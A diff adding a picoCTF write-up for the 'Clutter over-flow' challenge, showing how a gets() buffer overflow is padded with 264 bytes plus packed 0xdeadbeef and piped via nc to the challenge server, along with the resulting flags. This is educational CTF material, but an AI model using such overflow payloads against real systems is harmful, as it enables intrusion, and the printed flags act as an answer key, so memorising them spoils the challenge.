@@ -121,3 +121,72 @@ picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
 
 
 ***
+
+
+# Clutter over-flow
+
+## Solution
+
+- taking a look at the `chall.c` file reveals that it uses `gets` which means I can exploit it with overflow
+- the SIZE of clutter is defined as 0x100 = 256
+- if the variables `code` and `GOAL` are equal it will print the flag in flag.txt
+
+
+- Since I want to overflow the bufer I will need to put more than 256 + 8 random characters in the input. (+8 for the padding created by compiler)
+- I'll use python for that
+```
+>>> print((256+8+1)*"a")
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+```
+
+- I get a non zero hex for the code but its still not giving me the flag
+```
+My room is so cluttered...
+What do you see?
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+code == 0x61
+code != 0xdeadbeef :(
+```
+
+- this means I will probably need exactly the number of bytes that 0xdeadbeef stores and add 256+8 to that
+- I can get it using python
+```
+>>> import struct
+>>> struct.pack("<L", 0xdeadbeef)
+b'\xef\xbe\xad\xde'
+```
+
+- hence those 254 'a's and the bytes will overflow into the flag
+- adding them using python2 since python3 wont allow it
+```
+aditya@Dell-Inspiron:~$ touch new.py
+aditya@Dell-Inspiron:~$ nano new.py
+```
+```
+print((256+8)*"a" + b'\xef\xbe\xad\xde')
+```
+
+- now pipe the output to nc
+```
+ python2 new.py | nc mars.picoctf.net 31890
+```
+```
+My room is so cluttered...
+What do you see?
+code == 0xdeadbeef: how did that happen??
+take a flag for your troubles
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
+```
+
+## Flag:
+
+```
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
+```
+
+## Concepts learned:
+- learnt how to convert from hex to binary bytes
+- python3 cant add binary and str but python2 can
+
+
+
